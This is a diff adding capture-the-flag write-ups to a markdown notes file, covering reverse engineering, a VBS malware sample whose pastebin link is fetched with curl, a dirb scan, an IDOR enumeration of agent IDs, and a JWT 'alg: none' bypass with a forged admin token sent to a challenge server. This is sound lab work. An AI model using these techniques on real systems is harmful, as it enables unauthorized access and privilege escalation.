@@ -1175,8 +1175,224 @@ I suspect there was an issue on their end, as the only open port in the 5000-10,
 
 # Reverse Engineering and Malware
 
+## Hardcoded Lies
+
+![image](https://github.com/user-attachments/assets/5445a3a5-b4fd-4217-bf10-8357a08dff78)
 
 ---
 
+Unzip the binary:
+```bash
+┌──(root㉿kali)-[/home/kali/Hard]
+└─# unzip hardcodedlies.zip 
+Archive:  hardcodedlies.zip
+  inflating: hardcodedlies           
+
+┌──(root㉿kali)-[/home/kali/Hard]
+└─# ls -la
+total 48
+drwxr-xr-x  2 root root  4096 Jun 14 12:06 .
+drwx------ 19 kali kali  4096 Jun 14 12:06 ..
+-rwxr-xr-x  1 root root 33440 Jun  1 17:14 hardcodedlies
+-rw-rw-r--  1 kali kali  1253 Jun 14 12:05 hardcodedlies.zip
+```
+
+We can run the strings utility and find the hardcoded flag:
+```bash
+┌──(root㉿kali)-[/home/kali/Hard]
+└─# strings hardcodedlies             
+__PAGEZERO
+__TEXT
+__text
+__TEXT
+__stubs
+__TEXT
+__cstring
+__TEXT
+__unwind_info
+__TEXT
+__DATA_CONST
+__got
+__DATA_CONST
+__LINKEDIT
+/usr/lib/dyld
+/usr/lib/libSystem.B.dylib
+Initializing network interface...
+C1{h4rdc0ded_but_0verlooked}
+_printf
+__mh_execute_header
+__mh_execute_header
+_printf
+radr://5614542
+hardcodedlies
+```
+
+Our flag is:
+```bash
+C1{h4rdc0ded_but_0verlooked}
+```
+
+---
+
+## Encoded Evidence
+
+![image](https://github.com/user-attachments/assets/3dd7225c-1785-47b5-abfe-6d0f458f609a)
+
+---
+
+We receive a VBS script, probably pointing to a fileless malware situation.
+
+Because of Windows and obsidian enjoying deleting my documents, here is an image:
+
+![image](https://github.com/user-attachments/assets/6bc9e2aa-6182-44a2-9764-ba458e8c713b)
+
+We can curl the malicious link:
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# curl https://pastebin.com/raw/eqkzMd2M > output1.txt             
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    28    0    28    0     0    163      0 --:--:-- --:--:-- --:--:--   163
+```
+
+We get base64 encoded text:
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# cat output1.txt                                     
+QzF7bjBfZDNidWdfbjBfcDR5bn0K
+```
+
+Now we have our flag after decoding with base64:
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# echo "QzF7bjBfZDNidWdfbjBfcDR5bn0K" | base64 -d
+C1{n0_d3bug_n0_p4yn}
+```
+
+---
 
 # Web Application Security
+
+## Secret.txt Society
+
+![image](https://github.com/user-attachments/assets/a731eccb-c2f4-4c04-9a9f-7680e5516503)
+
+---
+
+On the home page it eludes to robots.txt being available:
+
+![image](https://github.com/user-attachments/assets/870c6c90-b65f-44f6-9300-0b1e3afc612c)
+
+I had DIRB running in the background with the default wordlist, lazy, while I was doing some manual recon.
+
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# dirb https://juche.msoidentity.com/        
+START_TIME: Sat Jun 14 11:16:39 2025
+URL_BASE: https://juche.msoidentity.com/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+---- Scanning URL: https://juche.msoidentity.com/ ----
++ https://juche.msoidentity.com/index.html (CODE:200|SIZE:4121)                    
++ https://juche.msoidentity.com/robots.txt (CODE:200|SIZE:134)                     
+```
+
+![image](https://github.com/user-attachments/assets/c66ea4bb-df36-4dc3-bbfe-ac9e9828e093)
+
+
+---
+
+## Field Reports Mayhem
+
+![image](https://github.com/user-attachments/assets/185394bd-5a5e-434c-94a1-684c4e479cd6)
+
+---
+
+I logged in using the above credentials to see the following:
+
+![image](https://github.com/user-attachments/assets/1c1192c5-2124-4e4a-ac3a-f25b34bbe8c5)
+
+This is an IDOR vulnerability, where we can change 1234 for the Agent ID to 1235 for testing and see the result:
+
+![image](https://github.com/user-attachments/assets/63f7afe4-2dbb-4873-90f7-df6a7c8fc396)
+
+User of ID 0, 1, or something low is probably an administrator user account due to the initial setup, if we are at user ID of 1234.
+
+I tried it out and user ID 0, 1, both lead to 1234. So we can only increment from there.
+
+I opened Burpsuite to look at the request:
+
+![image](https://github.com/user-attachments/assets/317c6108-e2ee-48e6-ba75-04266ed97acf)
+
+We can see what we were doing before here:
+
+![image](https://github.com/user-attachments/assets/92160eb7-9966-4cbf-8ce3-bf7b2bf95044)
+
+We can go as high as agent 1236 as 1237 redirects us back to our default agent (1234). 
+
+We can try going down now to 1233, which works:
+
+![image](https://github.com/user-attachments/assets/bc4ff680-b138-47d6-8137-cbcac8e53321)
+
+Going lower does not work, it redirects. We have a valid short range of users.
+
+After revisiting the description of the challenge I realized that 1337 was meant by 'leet', so here is the flag:
+
+![image](https://github.com/user-attachments/assets/c7181597-73dc-48de-8a77-8468c6a04449)
+
+---
+
+## None Shall Pass
+
+![image](https://github.com/user-attachments/assets/7aa29e76-25cd-4154-aef3-848aabd2fe6b)
+
+---
+
+There is an endpoint that requires us to login, we have the user and password thanks to the description.
+
+![image](https://github.com/user-attachments/assets/8e126985-45d0-4d05-90bc-040976cd6ce4)
+
+The website gives us a JWT (Java Web Token), we should be able to crack this:
+```bash
+Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0OTkxOTAyMywiZXhwIjoxNzQ5OTIyNjIzfQ.fhh7esBbGkUPVn0PeeA7r8P4CLrZjDyMrx-AUUIvLK8
+```
+
+We can pass this JWT to the `/secret/` page that expects one as a parameter in the URL post request:
+
+![image](https://github.com/user-attachments/assets/57ec378e-3aea-4b01-85a4-40c5f1627762)
+
+This Java Web Token when passed to the endpoint with curl says `Admins Only`:
+```bash
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# curl -H "Authorization: Bearer $(cat agent.jwt)" http://34.85.163.182:8080/secret
+{"error":"Admins only"}                     
+```
+
+So we need to create a JWT that matches the role of Admin, our current JWT is:
+```css
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# echo "$(cat agent.jwt)" | cut -d '.' -f2 | base64 -d | jq .
+{
+  "user": "agent",
+  "role": "user",
+  "iat": 1749922601,
+  "exp": 1749926201
+}
+```
+
+We can use this to create the token: https://jwt.io/
+
+We can switch the `"alg"` field to `none` in order to bypass the requirement for a JWT secret, which we may not be able to obtain in this case.
+
+We will also switch the role to `admin` to impersonate an administrator:
+
+![image](https://github.com/user-attachments/assets/f2b46608-488f-4a68-a6fb-fc7acd5ad94f)
+
+This returns the flag to us:
+```bash
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDk5MzA1OTUsImV4cCI6MTc0OTkzNDE5NX0." http://34.85.163.182:8080/secret
+{"flag":"C1{n0n3_4lg0_byp4ss}"}    
+```
+
+---
